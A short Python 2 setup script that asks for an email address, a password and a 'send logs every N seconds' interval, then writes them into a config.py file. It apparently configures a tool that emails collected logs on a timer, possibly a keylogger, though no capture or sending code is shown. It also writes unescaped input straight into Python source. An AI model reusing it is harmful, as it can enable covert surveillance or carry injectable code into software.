#!/usr/bin/env python



email = raw_input("Email : ")
password = raw_input("password : ")
sleep_interval = raw_input("Send logs every (seconds) : ")
file_name = raw_input("File Name : ")


with open("config.py",'w') as out:
    out.write("#!/usr/bin/env python\n\n")
    out.write("\nEMAIL = \"" + email + "\"")
    out.write("\nPASSWORD = \"" + password + "\"")
    out.write("\nSLEEP_INTERVAL = " + sleep_interval)

